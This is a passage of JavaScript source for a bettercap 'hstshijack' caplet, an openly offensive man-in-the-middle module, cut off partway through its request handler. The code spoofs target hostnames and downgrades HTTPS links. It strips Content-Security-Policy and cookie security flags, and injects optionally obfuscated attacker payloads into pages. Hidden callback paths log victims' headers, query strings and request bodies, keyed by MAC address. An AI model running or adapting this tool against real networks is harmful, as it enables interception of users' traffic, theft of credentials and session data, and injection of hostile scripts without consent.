/*
 * Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 */

var ssl = {
  /* Prefix string mapped array of indexed domains. */
  "index": {},
  /* Unicode hierarchy for domain names. */
  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz",
  /* Prefix hierarchy for domain names. */
  "prefixes": ["www.","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"],
};

var payload,
    payload_container_prefix = (
      "if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
        "globalThis.{{SESSION_ID_TAG}} = function() {\n"),
    payload_container_suffix = (
        "\n}\n" +
        "globalThis.{{SESSION_ID_TAG}}();\n" +
      "}\n");

var ignore_hosts       = [],
    target_hosts       = [],
    replacement_hosts  = [],
    block_script_hosts = [];

var payloads = {},
    obfuscate;

var callback_path,
    whitelist_path,
    ssl_index_path,
    session_id,
    varname_target_hosts,
    varname_replacement_hosts;

var math_seed;

var whitelist = {};

var selector_header = /^\s*(.*?)\s*:\s*(.*?)\s*$/,
    selector_header_csp = /content-security-policy:.*?\r\n/ig,
    selector_header_set_cookie = /^set-cookie$/i,
    selector_header_set_cookie_secure_samesite = /^(?:secure$|samesite=)/i,
    selector_content_type_html = /text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)/i,
    selector_extension_html = /[.](?:html|htm|xml|xhtml|xhtm|xht|hta)$/i,
    selector_meta_tag_csp = / http-equiv=['"]?Content-Security-Policy['"]?([ />])/ig,
    selector_strip_whitespace = /^\s*(.*?)\s*$/,
    selector_uri_one = /^https:\/\//i,
    selector_uri_two = /https:\/\/([^:/?#]*).*/i,
    selector_content_type_js = /\S+\/javascript/i,
    selector_html_magic = /^\s*</g,
    selector_html_script_open_tag = /<script(\s|>)/ig,
    selector_html_script_close_tag = /<\/script(\s|>)/ig,
    selector_all_dashes = /-/g,
    selector_all_dots = /\./g,
    selector_scheme_http_https_colon = /(http)s:/ig,
    selector_port_https = /:443($|[^0-9])/g,
    selector_regset_wildcard_one = /^\*\./,
    selector_regset_wildcard_two = /\.\*$/,
    selector_regset_wildcard_three = /\.\*$/g,
    selector_regset_wildcard_four = /\.\*/g,
    selector_query_param = /^([^=]*)=(.*)$/;

var red      = "\x1b[31m",
    yellow   = "\x1b[33m",
    green    = "\x1b[32m",
    blue     = "\x1b[34m",
    on_white = "\x1b[47;30m",
    on_grey  = "\x1b[40;37m",
    on_blue  = "\x1b[104;30m",
    bold     = "\x1b[1;37m",
    reset    = "\x1b[0m";

function randomString(length) {
  length = parseInt(length);
  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
      buff  = new Array(length);
  for (var a = 0; a < buff.length; a++) {
    index = parseInt(Math.random() * chars.length);
    buff[a] = chars.charAt(index)
  }
  return buff.join("");
}

function toRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(selector_all_dots, "\\.");
  selector_string = selector_string.replace(selector_all_dashes, "\\-");
  return [
    new RegExp("(^|[^a-z0-9-.])" + selector_string + "($|[^a-z0-9-.])", "ig"),
    "$1" + replacement_string + "$2"
  ];
}

function toWholeRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(selector_all_dots, "\\.");
  selector_string = selector_string.replace(selector_all_dashes, "\\-");
  return [
    new RegExp("^" + selector_string + "$", "ig"),
    replacement_string
  ];
}

function toWildcardRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(selector_all_dashes, "\\-");
  if (selector_regset_wildcard_one.test(selector_string)) {
    selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
    selector_string = selector_string.replace(selector_all_dots, "\\.");
    replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
    return [
      new RegExp(selector_string, "ig"),
      "$1" + replacement_string
    ];
  } else if (selector_regset_wildcard_two.test(selector_string)) {
    selector_string = selector_string.replace(selector_regset_wildcard_three, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
    selector_string = selector_string.replace(selector_all_dots, "\\.");
    replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
    return [
      new RegExp(selector_string, "ig"),
      replacement_string + "$1"
    ];
  } else {
    log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").");
  }
}

function toWholeWildcardRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(selector_all_dashes, "\\-");
  if (selector_regset_wildcard_one.test(selector_string)) {
    selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
    selector_string = selector_string.replace(selector_all_dots, "\\.");
    replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
    return [
      new RegExp("^" + selector_string + "$", "ig"),
      "$1" + replacement_string
    ];
  } else if (selector_regset_wildcard_two.test(selector_string)) {
    selector_string = selector_string.replace(selector_regset_wildcard_four, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
    selector_string = selector_string.replace(selector_all_dots, "\\.");
    replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
    return [
      new RegExp(selector_string, "ig"),
      replacement_string + "$1"
    ];
  } else {
    log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").");
  }
}

/* Matches /(^|[^a-z0-9-.])example\.com($|[^a-z0-9-.])/ig */
function toRegexpSet(selector_string, replacement_string) {
  if (selector_string.indexOf("*") !== -1) {
    return toWildcardRegexp(selector_string, replacement_string);
  } else {
    return toRegexp(selector_string, replacement_string);
  }
}

/* Matches ^example.com$ */
function toWholeRegexpSet(selector_string, replacement_string) {
  if (selector_string.indexOf("*") !== -1) {
    return toWholeWildcardRegexp(selector_string, replacement_string);
  } else {
    return toWholeRegexp(selector_string, replacement_string);
  }
}

/* Saves the list of domains using SSL, as well as its index ranges. */
function saveSSLIndex() {
  domains = [];
  for (a = 0; a !== ssl.prefixes.length; a++) {
    prefix = ssl.prefixes[a];
    domains = domains.concat(ssl.index[prefix]);
  }
  ssl.domains = domains;
  writeFile(env["hstshijack.ssl.domains"], domains.join("\n"));
  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index));
}

/* Saves the list of domains using SSL, as well as its index ranges. */
function saveWhitelist() {
  writeFile(env["hstshijack.whitelist"], JSON.stringify(whitelist));
}

/* Returns the amount of characters of an identical prefix of two given strings. */
function getMatchingPrefixLength(string1, string2) {
  count = 0;
  if (string1.length > string2.length) {
    for (a = 0; a !== string2.length; a++) {
      if (string1.charAt(a) !== string2.charAt(a)) {
        break;
      }
      count++;
    }
  } else {
    for (a = 0; a !== string1.length; a++) {
      if (string1.charAt(a) !== string2.charAt(a)) {
        break;
      }
      count++;
    }
  }
  return count;
}

/* Returns true if domain1 gets alphanumeric precendence over domain2. */
function getsPrecedence(domain1, domain2) {
  if (domain1.length > domain2.length) {
    /* If the first given domain is longer than the second. */
    for (a = 0; a !== domain2.length; a++) {
      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
      if (rank1 > rank2) {
        return false;
      } else if (rank1 < rank2) {
        return true;
      }
    }
    return false;
  } else {
    /* If the second given domain is longer than the first. */
    for (a = 0; a !== domain1.length; a++) {
      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
      if (rank1 > rank2) {
        return false;
      } else if (rank1 < rank2) {
        return true;
      }
    }
    return true;
  }
}

/* Returns the index of a given domain. */
function getDomainIndex(domain) {
  domain = domain.toLowerCase();
  for (a = 0; a !== ssl.prefixes.length; a++) {
    prefix = ssl.prefixes[a];
    if (domain.startsWith(prefix)) {
      return ssl.index[prefix].indexOf(domain);
    }
  }
}

/* Index a new domain. */
function indexDomain(domain) {
  domain = domain.toLowerCase();
  domain_prefix = "";
  for (a = 0; a !== ssl.prefixes.length; a++) {
    prefix = ssl.prefixes[a];
    if (domain.startsWith(prefix)) {
      domain_prefix = prefix;
      break;
    }
  }
  indexed_domains = ssl.index[domain_prefix];
  if (indexed_domains.indexOf(domain) === -1) {
    /* This domain is not indexed yet. */
    log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");
    if (indexed_domains.length !== 0) {
      for (a = 0; a < indexed_domains.length; a++) {
        indexed_domain = indexed_domains[a];
        if (getsPrecedence(domain, indexed_domain)) {
          ssl.index[domain_prefix] = indexed_domains.slice(0, a)
            .concat(domain)
            .concat(indexed_domains.slice(a, indexed_domains.length));
          saveSSLIndex();
          return;
        }
      }
      ssl.index[domain_prefix].push(domain);
    } else {
      ssl.index[domain_prefix] = [domain];
    }
    saveSSLIndex();
  } else {
    /* This domain is already indexed. */
    log_debug(on_blue + "hstshijack" + reset + " Skipped already indexed domain " + bold + domain + reset);
  }
}

function configure() {
  /* Read caplet. */
  env["hstshijack.ignore"]
    ? ignore_hosts = env["hstshijack.ignore"].replace(/\s/g, "").split(",")
    : ignore_hosts = [];
  env["hstshijack.targets"]
    ? target_hosts = env["hstshijack.targets"].replace(/\s/g, "").split(",")
    : target_hosts = [];
  env["hstshijack.replacements"]
    ? replacement_hosts = env["hstshijack.replacements"].replace(/\s/g, "").split(",")
    : replacement_hosts = [];
  env["hstshijack.blockscripts"]
    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")
    : block_script_hosts = [];
  env["hstshijack.obfuscate"]
    ? obfuscate = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()
    : obfuscate = false;

  /* Validate caplet. */
  if (target_hosts.length < replacement_hosts.length) {
    log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").");
  }
  if (target_hosts.length > replacement_hosts.length) {
    log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").");
  }
  if (target_hosts.indexOf("*") !== -1) {
    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).");
  }
  if (replacement_hosts.indexOf("*") !== -1) {
    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).");
  }

  whole_prefix_wildcard_domain_selector = /^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i;
  whole_suffix_wildcard_domain_selector = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i;
  for (a = 0; a < ignore_hosts.length; a++) {
    if (
         !/^\*$/i.test(ignore_hosts[a])
      && !whole_prefix_wildcard_domain_selector.test(ignore_hosts[a])
      && !whole_suffix_wildcard_domain_selector.test(ignore_hosts[a])
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");
    }
  }

  for (a = 0; a < target_hosts.length; a++) {
    if (
         !whole_prefix_wildcard_domain_selector.test(target_hosts[a])
      && !whole_suffix_wildcard_domain_selector.test(target_hosts[a])
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");
    }

    if (
         !whole_prefix_wildcard_domain_selector.test(replacement_hosts[a])
      && !whole_suffix_wildcard_domain_selector.test(replacement_hosts[a])
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");
    }

    if (/\*/g.test(target_hosts[a]) || /\*/g.test(replacement_hosts[a])) {
      target_host_wildcard_count      = target_hosts[a].match(/\*/g).length      || 0;
      replacement_host_wildcard_count = replacement_hosts[a].match(/\*/g).length || 0;
      if (target_host_wildcard_count !== replacement_host_wildcard_count) {
        log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[a] + " and " + replacement_hosts[a] + ").");
      }
    }
  }

  for (a = 0; a < block_script_hosts.length; a++) {
    if (
         !/^\*$/i.test(block_script_hosts[a])
      && !whole_prefix_wildcard_domain_selector.test(block_script_hosts[a])
      && !whole_suffix_wildcard_domain_selector.test(block_script_hosts[a])
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");
    }
  }

  if (obfuscate === "true") {
    obfuscate = true;
  } else {
    obfuscate = false;
  }

  /* Prepare payloads. */
  env["hstshijack.payloads"]
    ? payload_entries = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
    : payload_entries = [];

  for (a = 0; a < payload_entries.length; a++) {
    if (
         !/^\*:.+$/i.test(payload_entries[a])
      && !/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i.test(payload_entries[a])
      && !whole_suffix_wildcard_domain_selector.test(payload_entries[a])
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");
    }

    payload_host = payload_entries[a].replace(/[:].*/, "");
    payload_path = payload_entries[a].replace(/.*[:]/, "");

    payload = "";
    if (!(payload = readFile(payload_path))) {
      log_fatal(on_blue + "hstshijack" + reset + " Could not read a payload (got " + payload_path + ").");
    } else {
      payload = payload
        .replace(/obf_hstshijack_var_target_hosts/g, varname_target_hosts)
        .replace(/obf_hstshijack_var_replacement_hosts/g, varname_replacement_hosts)
        .replace(/obf_hstshijack_path_callback/g, callback_path)
        .replace(/obf_hstshijack_path_ssl_index/g, ssl_index_path)
        .replace(/obf_hstshijack_path_whitelist/g, whitelist_path);

      if (obfuscate) {
        obfuscation_variables = payload.match(/obf_hstshijack_[a-z0-9_]*/ig) || [];
        for (b = 0; b < obfuscation_variables.length; b++) {
          if (obfuscation_variables.indexOf(obfuscation_variables[b]) === b) {
            regexp = new RegExp(obfuscation_variables[b], "g");
            payload = payload.replace(regexp, randomString(8 + (Math.random() * 8)));
          }
        }
      }

      if (payloads[payload_host]) {
        payloads[payload_host] = payloads[payload_host] + "\n" + payload + "\n";
      } else {
        payloads[payload_host] = payload + "\n";
      }
    }
  }

  /* Prepare payload container */
  payload_container_prefix = payload_container_prefix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
  payload_container_prefix = payload_container_prefix +
    "var " + varname_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"];\n" +
    "var " + varname_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"];\n";
  payload_container_suffix = payload_container_suffix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);

  /* Prepare whitelist */
  whitelist_file_path = env["hstshijack.whitelist"];
  try {
    whitelist = JSON.parse(readFile(whitelist_file_path));
  } catch (err) {
    log_fatal(on_blue + "hstshijack" + reset + " Could not read whitelist file (got " + whitelist_file_path + "). Please enter a valid hstshijack.whitelist value in your caplet.");
  }

  /* Prepare SSL index */
  ssl_index_check = env["hstshijack.ssl.check"].toLowerCase() || "true";
  all_domains = readFile(env["hstshijack.ssl.domains"]).split("\n");
  for (a = 0; a !== ssl.prefixes.length; a++) {
    ssl.index[ssl.prefixes[a]] = [];
  }
  if (all_domains.length === 0) {
    log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");
  } else {
    if (ssl_index_check !== "false") {
      log_info(on_blue + "hstshijack" + reset + " Indexing SSL domains ...");
      all_domains
        .sort()
        .filter(function(domain, index, arr){
          if (domain !== "" && arr.indexOf(domain) === index) {
            indexDomain(domain);
          }
        });
    } else {
      ssl.domains = all_domains;
      index_file_contents = readFile(env["hstshijack.ssl.index"]);
      if (ssl.domains.length !== 0 && index_file_contents === "") {
        log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
      }
      try {
        ssl.index = JSON.parse(index_file_contents);
      } catch (err) {
        log_fatal(on_blue + "hstshijack" + reset + "(" + err + ") List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
      }
      indexed_domains_length = 0;
      for (a = 0; a !== ssl.prefixes.length; a++) {
        indexed_domains_length += ssl.index[ssl.prefixes[a]].length;
      }
      if (indexed_domains_length !== all_domains.length) {
        log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
      }
      log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");
    }
  }

  /* Ensure targeted hosts are in SSL log (no wildcards). */
  for (var a = 0; a < target_hosts.length; a++) {
    if (target_hosts[a].indexOf("*") === -1) {
      indexDomain(target_hosts[a]);
    }
  }

  saveSSLIndex();
  log_info(on_blue + "hstshijack" + reset + " Indexed " + ssl.domains.length + " domains.");
}

function showConfig() {
  /* Print module configuration. */
  logStr  = "\n";
  logStr += "  " + bold + "Caplet" + reset + "\n";
  logStr += "\n";
  logStr += "    " + yellow + " hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (/^true$/i.test(env["hstshijack.ssl.check"]) ? green + "true" : red + "false") + reset + "\n";
  logStr += "    " + yellow + "      hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "     hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "hstshijack.blockscripts" + reset + " > " + (env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\n";
  logStr += "    " + yellow + "    hstshijack.payloads" + reset + " > ";
  if (env["hstshijack.payloads"]) {
    list = env["hstshijack.payloads"].replace(/\s/g, "").split(",");
    logStr += green + list[0] + reset + "\n";
    if (list.length > 1) {
      for (a = 1; a < list.length; a++) {
        logStr += "                            > " + green + list[a] + reset + "\n";
      }
    }
  } else {
    logStr += red + "undefined" + reset + "\n";
  }
  logStr += "\n";
  logStr += "  " + bold + "Commands" + reset + "\n";
  logStr += "\n";
  logStr += "    " + bold + "       hstshijack.show" + reset + " : Show module info.\n";
  logStr += "    " + bold + "hstshijack.ssl.domains" + reset + " : Show recorded domains with SSL.\n";
  logStr += "    " + bold + "  hstshijack.ssl.index" + reset + " : Show SSL domain index.\n";
  logStr += "\n";
  logStr += "  " + bold + "Session info" + reset + "\n";
  logStr += "\n";
  logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\n";
  logStr += "    " + bold + " Callback path" + reset + " : " + callback_path + "\n";
  logStr += "    " + bold + "Whitelist path" + reset + " : " + whitelist_path + "\n";
  logStr += "    " + bold + "SSL index path" + reset + " : " + ssl_index_path + "\n";
  logStr += "    " + bold + "   SSL domains" + reset + " : " + ssl.domains.length + " domain" + (ssl.domains.length === 1 ? "" : "s") + "\n";
  console.log(logStr);
}

function onCommand(cmd) {
  if (cmd === "hstshijack.show") {
    showConfig();
    return true;
  }
  if (cmd === "hstshijack.ssl.domains") {
    if (ssl.domains.length > 20) {
      truncated_domains = ssl.domains.slice(0, 20);
      truncated_domains.push("...");
      log_string = truncated_domains.join(reset + "\n    " + yellow);
      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + log_string + reset + "\n");
    } else {
      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + ssl.domains.join(reset + "\n    " + yellow) + reset + "\n");
    }
    return true;
  }
  if (cmd === "hstshijack.ssl.index") {
    log_string = "\n" + bold + "  SSL domain index" + reset + "\n";
    for (a = 0; a !== ssl.prefixes.length; a++) {
      domain_prefix = ssl.prefixes[a];
      log_string += "\n    " + yellow + domain_prefix + reset + " (length: " + ssl.index[domain_prefix].length + ")";
    }
    console.log(log_string + "\n");
    return true;
  }
  if (cmd === "hstshijack.whitelist") {
    console.log("\n" + JSON.stringify(whitelist, null, 2) + "\n");
    return true;
  }
}

function onLoad() {
  math_seed = new Date().getMilliseconds();
  Math.random = function() {
    r = Math.sin(math_seed++) * 10000;
    return r - Math.floor(r);
  }
  String.prototype.startsWith = function(prefix) {
    return this.slice(0, prefix.length) === prefix;
  }

  log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");
  session_id                = randomString(8 + Math.random() * 8);
  varname_target_hosts      = randomString(8 + Math.random() * 8);
  varname_replacement_hosts = randomString(8 + Math.random() * 8);
  callback_path             = "/" + randomString(8 + Math.random() * 8);
  whitelist_path            = "/" + randomString(8 + Math.random() * 8);
  ssl_index_path            = "/" + randomString(8 + Math.random() * 8);

  log_info(on_blue + "hstshijack" + reset + " Reading caplet ...");
  configure();
  log_info(on_blue + "hstshijack" + reset + " Module loaded.");
  showConfig();
}

function onRequest(req, res) {
  if (req.Path === ssl_index_path) {
    /*
      SSL callback.

      Requests made for this path should include a hostname in the query so
      this module can send a HEAD request to learn HTTPS redirects.
    */
    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Query + reset + ".");
    queried_host = req.Query;
    if (getDomainIndex(queried_host) === -1) {
      log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");
      req.Hostname = queried_host;
      req.Path     = "/";
      req.Query    = "";
      req.Body     = "";
      req.Method   = "HEAD";
    }
  } else if (req.Path === callback_path) {
    /*
      Basic callback.

      Requests made for this path will be dropped.
      Requests made for this path will be printed.
    */
    req.Scheme = "ignore";
    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n";
    logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n";
    headers = req.Headers.split("\r\n");
    for (i = 0; i < headers.length; i++) {
      if (headers[i].split(": ").length === 2) {
        params = headers[i].split(": ");
        logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
      } else {
        logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n";
      }
    }
    logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n";
    queries = req.Query.split("&");
    for (i = 0; i < queries.length; i++) {
      if (queries[i].split("=").length === 2) {
        params = queries[i].split("=");
        logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
      } else {
        logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n";
      }
    }
    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
    log_info(logStr);
  } else if (req.Path === whitelist_path) {
    /*
      Whitelisting callback.

      Requests made for this path will be dropped.
      Requests made for this path will be printed.
      Requests made for this path will stop all attacks towards this client with the requested hostname.
    */
    req.Scheme = "ignore";
    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n";
    logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n";
    headers = req.Headers.split("\n");
    for (i = 0; i < headers.length; i++) {
      if (headers[i].split(": ").length === 2) {
        params = headers[i].split(": ");
        logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
      } else {
        logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n";
      }
    }
    logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n";
    queries = req.Query.split("&");
    for (i = 0; i < queries.length; i++) {
      if (queries[i].split("=").length === 2) {
        params = queries[i].split("=");
        logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
      } else {
        logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n";
      }
    }
    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
    log_info(logStr);

    /* Add requested hostname to whitelist. */
    if (whitelist[req.Client.MAC]) {
      if (whitelist[req.Client.MAC].indexOf(req.Hostname) === -1) {
        whitelist[req.Client.MAC].push(req.Hostname);
      }
    } else {
      whitelist[req.Client.MAC] = [req.Hostname];
    }
    /* Also whitelist unspoofed version of requested hostname. */
    for (a = 0; a < target_hosts.length; a++) {
      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a]);
      if (whole_regexp_set[0].test(req.Hostname)) {
        whitelist[req.Client.MAC].push(req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]));
        break;
      }
    }
    saveWhitelist();
  } else {
    /*
      Not a callback.

      Redirect client to the real host if a whitelist callback was received previously.
      Restore spoofed hostnames and schemes in request.
    */
    if (whitelist[req.Client.MAC]) {
      for (a = 0; a < whitelist[req.Client.MAC].length; a++) {
        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.MAC][a], "");
        if (whole_regexp_set[0].test(req.Hostname)) {
          /* Restore requested hostname if it was spoofed. */
          var unspoofed_host;
          for (b = 0; b < replacement_hosts.length; b++) {
            whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b]);
            if (whole_regexp_set[0].test(req.Hostname)) {
              unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
              query = (req.Query !== "" ? ("?" + req.Query) : "");
              res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
              res.Status = 301;
              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.MAC + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
              return;
            }
          }
        }
      }
    }

    /* Restore original hostnames. */
    for (a = 0; a < target_hosts.length; a++) {
      /* Restore original hostnames in headers. */
      regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);
      regexp_set[0].lastIndex = 0;
      if (regexp_set[0].test(req.Headers)) {
        req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);
        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
      }

      if (req.Query !== "") {
        /* Restore original hostnames in query URI. */
        regexp_set[0].lastIndex = 0;
        if (regexp_set[0].test(req.Query)) {
          req.Query = req.Query.replace(regexp_set[0], regexp_set[1]);
          log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in query URI.");
        }

        /* Restore original hostnames in encoded query URI parameters. */
        query_params = req.Query.split("&");
        new_params = [];
        for (b = 0; b < query_params.length; b++) {
          param = query_params[b];
          param_parts = param.match(selector_query_param);
          if (param_parts) {
            param_name = param_parts[1];
            param_value = param_parts[2];
            if (param_value.indexOf("%") !== -1) {
              param_value_decoded = decodeURIComponent(param_value);
              if (param_value !== param_value_decoded) {
                regexp_set[0].lastIndex = 0;
                if (regexp_set[0].test(param_value_decoded)) {
                  param_value_decoded_spoofed = param_value_decoded.replace(
                    regexp_set[0],
                    regexp_set[1]);
                  new_params.push(
                    param_name + "=" + encodeURIComponent(param_value_decoded_spoofed));
                } else {
                  new_params.push(param);
                }
              } else {
                new_params.push(param);
              }
            } else {
              regexp_set[0].lastIndex = 0;
              if (regexp_set[0].test(param_value)) {
                param_value_spoofed = param_value.replace(regexp_set[0], regexp_set[1]);
                new_params.push(param_name + "=" + param_value_spoofed);
              } else {
                new_params.push(param);
              }
            }
          } else {
            new_params.push(param);
          }
        }
        new_query_string = new_params.join("&");
        if (new_query_string !== req.Query) {
          req.Query = new_query_string;
        }
      }

      /* Restore original hostname of request. */
      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])
      if (whole_regexp_set[0].test(req.Hostname)) {
        spoofed_host = req.Hostname;
        req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
        req.Scheme   = "https";
